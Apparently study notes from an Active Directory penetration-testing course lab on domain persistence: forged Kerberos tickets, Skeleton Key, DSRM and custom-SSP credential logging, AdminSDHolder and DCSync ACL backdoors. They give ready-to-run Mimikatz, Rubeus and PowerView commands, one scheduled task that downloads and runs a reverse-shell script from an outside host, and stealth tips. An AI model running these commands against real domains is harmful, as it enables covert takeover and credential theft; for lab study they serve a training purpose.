> **Note -:** You only need a domain admin privileges to set up persistence, while using the persistence you never require the domain admin privileges, although you might sometimes need domain admin privileges to read/write to files.



# **Domain Persistence**


- There is much to active directory than "just" the Domain Admin.
- Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!



# **Kerberos**

- `Kerberos` is the basis of authentication in a Windows Active Directory environment.
- Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (`KDC`) which is a service running on the domain controller.
- These tickets represent the client's credentials.Therefore, `Kerberos` is understandably a very interesting target of abuse!



![](https://i.imgur.com/lpHU58k.png)



# **Golden Ticket**


- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.




![](https://i.imgur.com/f4Ti5Jm.png)




|  Options    |      |
|:-----|:-----|
|  kerberos::golden    |   Name of the module   |
|    /User:Administrator  |   Username for which the TGT is generated   |
|   /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
|  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
|   OR         |
|    /ticket  |    Saves the ticket to a file for later use  |
|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |



**_Example Command_ -:**

- Run the below command to create a Golden ticket on any machine that has network connectivity with DC (You can use the above table to check what each does):

```powershell
$ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```



# **Learning Objective 8**

- Extra secrets from the domain controller of dollarcorp.
- Using the secrets of `krbtgt` account, create a golden ticket.
- Use the Golden ticket to (once again) get domain admin privileges from a machine


## **Solution**


**_Coming Soon_**


# **Silver Ticket**


- A valid `TGS` (Golden ticket is `TGT`).
- Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
- Services rarely check `PAC` (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).




![](https://i.imgur.com/FIuN49E.png)






|  Options    |      |
|:-----|:-----|
|  kerberos::golden    |   Name of the module (there is no silver module!)  |
|    /User:Administrator  |   Username for which the TGT is generated   |
|   /domain:dollarcorp.moneycorp.local   |  Domain FQDN    |
|  /sid:S-1-5-21-719815819-3726368948-3917688648|   SID of the domain   |
| /target:dcorp-dc.dollarcorp.moneycorp.local | Target server FQDN |
|    /service:cifs  |  The SPN name of service for which TGS is to be created    |
|   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848   |   AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.  |
|    /id:500 /groups:512  |   Optional User RID (default 500) and Group default 513 512 520518 519)   |
| /ptt   |    Injects the ticket in current PowerShell process - no need to save the ticket on disk  |
|    /startoffset:0  |  Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.    |
|    /endin:600  |    Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes  |
|   /renewmax:10080   |   Optional ticket lifetime with renewal (default is 10 years)in minutes. The default AD setting is 7 days = 100800   |


**_Example Usage -:_**

- Using `hash` of the Domain Controller computer account, below command provides access to file system on the DC

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

# Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more
```

- There are also various ways of achieving command execution using Silver tickets. 
- Create a silver ticket for the **HOST SPN** which will allow us to schedule a task on the target:



```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```



Schedule and execute a task - noisy but fine for PoC :)



```powershell
$ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```


# **Learning Objective 9**


- [ ] During the additional lab time:
	- Try to get command execution on the domain controller by creating silver tickets for:
		- HOST service
		- WMI



## **Solution**


**_Coming Soon_**



> In case of Golden ticket we forge a `TGT`, in case of Silver ticket we forge a Service ticket or a `TGS`




# **Diamond Ticket**


- A diamond ticket is created by decrypting a valid `TGT`, making changes to it and re-encrypt it using the `AES` keys of the krbtgt account.
- Golden ticket was a `TGT` forging attacks whereas diamond ticket is a `TGT` modification attack. 
- Once again, the persistence lifetime depends on krbtgt account.
- A diamond ticket is more opsec safe as it has: 
	- Valid ticket times because a `TGT` issued by the DC is modified
	- In golden ticket, there is no corresponding `TGT` request for TGS/Service ticket requests as the `TGT` is forged.
- A diamond ticket should be chosen over a golden ticket in a real assessment.


> In **Golden tickets** we forge a `TGT`, in **Diamond ticket** we open it up (decrypt), make changes and re-encrypt it


**_Example Usage -:_**


- We would still need `krbtgt AES keys`. Use the following `Rubeus` command to create a diamond ticket (note that `RC4` or `AES` keys of the user can be used too):


```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```



- We could also use `/tgtdeleg` option in place of credentials in case we have access as a domain user:


```powershell
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# **Learning Objective 10**


- Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.



## **Solution**


**_Coming Soon_**



# **Skeleton Key**


- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware. 
- All the publicly known methods are NOT persistent across reboots.Yet again, mimikatz to the rescue.


**_Example Usage -:_**

- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required


```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```



- Now, it is possible to access any machine with a valid username and password as "mimikatz"



```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```


> Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.


- In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target
 
- DC:


```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```



- Note that above would be very noisy in logs - Service installation (Kernel mode driver)



# **DSRM**

- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.



![](https://i.imgur.com/05CvCxs.png)


**_Example Usage -:_**


- Dump DSRM password (needs DA privs)

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

- Compare the Administrator hash with the Administrator hash of below command

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

- First one is the DSRM local Administrator.

--- 

- Since it is the local administrator of the DC, we can also pass the hash to authenticate.
- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash.

```powershell
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```



- Then use the below command to pass the hash


```powershell
$ Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

$ ls \\dcorp-dc\C$
```



# **Learning Objective 11**


- During additional lab time:
- Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.



## **Solution**


**_Coming Soon_**



# **Custom SSP**

- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are

- NTLM
- Kerberos
- Wdigest
- CredSSP

- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.


**_Examples -:_**


- [ ] We can use either of the ways:

- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security` Packages:

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```


- Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

All local logons on the DC are now logged to `C:\Windows\system32\mimilsa.log`


![](https://i.imgur.com/87AenfB.png)


> **Note -:** As said in the beginning, you will need domain admin privileges to read the dump passwords in clear text, however we can still read this files without privileges by making sure that credentials are dropped to `C:\Windows\SYSVOL`, It consists of the domain public files that need to be accessed by clients and kept synced between DCs, it is also world writable and readable, so we can find a way to compile our own mimikatz and make minor changes to this module to save the file in the `SYSVOL` directory as specified earlier


# **Using ACLs - AdminSDHolder**


- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).

- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

- Protected Groups




|      |      |
|:-----|:-----|
|  Account Operators    |   Enterprise Admins   |
|   Backup Operators   |   Domain Controllers   |
|   Server Operators   |   Read-only Domain Controllers   |
|  Print Operators    |  Schema Admins    |
|   Domain Admins   |  Administrators    |
|   Replicator   |      |



- Well known abuse of some of the Protected Groups - All of the below can log on locally to DC



|      |      |
|:-----|:-----|
|    Account Operators  | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.     |
|  Backup Operators    |  Backup GPO, edit to add SID of controlled account to a privileged group and Restore.    |
|  Server Operators    |   Run a command as system (using the disabled Browser service)   |
| Print Operators     |   Copy ntds.dit backup, load device drivers.   |



- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.


**_Example -:_**



- Add FullControl permissions for a user to the AdminSDHolder using `PowerView` as DA:


```powershell
# Powerview

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 - Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```



- Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE) :




```powershell

Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -
Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```



- Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder,:

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```



```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```


- Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory to make any of the above command take effect:



```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```


- For pre-Server 2008 machines:


```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```



**_More Examples - :_**


- Check the **Domain Admins permission** - `PowerView` as normal user:


```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```


- Using `ActiveDirectory Module`:

```powershell
(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```


- Abusing **Full-control** using `PowerView`:


```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```



- Using `ActiveDirectory Module`:



```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```



- Abusing **ResetPassword** using `PowerView`:



```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```


- Using `ActiveDirectory Module`:



```powershell
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```



- Add **Full Control** rights, `Powerview`:


```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```




- Using` ActiveDirectory Module` and `RACE`:



```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
```



- Add rights for DCSync:



```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```


- Using ActiveDirectory Module and RACE:


```powershell
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
```


Execute DCSync:


```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


or

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```




 # **Learning Objective 12**


- Check if studentx has Replication (DCSync) rights.
- If yes, execute the DCSync attack to pull hashes of the krbtgt user.
- If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.


## **Solution**



**_Coming Soon_**



# **Using ACLs - Security Descriptors - WMI**


- ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:



```powershell
# First of all run (to import RACE Toolikit) -:

C:\AD\Tools\RACE-master\RACE.ps1

#• On local machine for student1:

Set-RemoteWMI -SamAccountName student1 -Verbose

#• On remote machine for student1 without explicit credentials:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose

#• On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose

#• On remote machine remove permissions:

Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```


**Example**

- After running the 2nd payload as shown above we can use `gwmi` to check for information on the DC


![](https://i.imgur.com/WNWRJR1.png)



# **Using ACLs - Security Descriptors - PowerShell Remoting**


